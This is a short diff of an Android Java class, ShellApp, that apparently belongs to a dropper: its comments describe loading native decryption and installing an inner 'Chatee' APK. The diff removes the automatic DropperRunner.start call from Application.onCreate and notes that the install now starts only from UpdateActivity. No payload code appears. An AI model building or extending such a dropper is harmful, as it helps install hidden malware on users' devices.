@@ -2,13 +2,6 @@ package com.pkg.loader.dispatch;
 
 import android.app.Application;
 
-import com.pkg.loader.dispatch.internal.DropperRunner;
-
-/** Meat-style shell: loads native decrypt + installs inner Chatee APK. */
+/** Dropper shell — install starts only from UpdateActivity (meat-style). */
 public class ShellApp extends Application {
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        DropperRunner.start(this);
-    }
 }
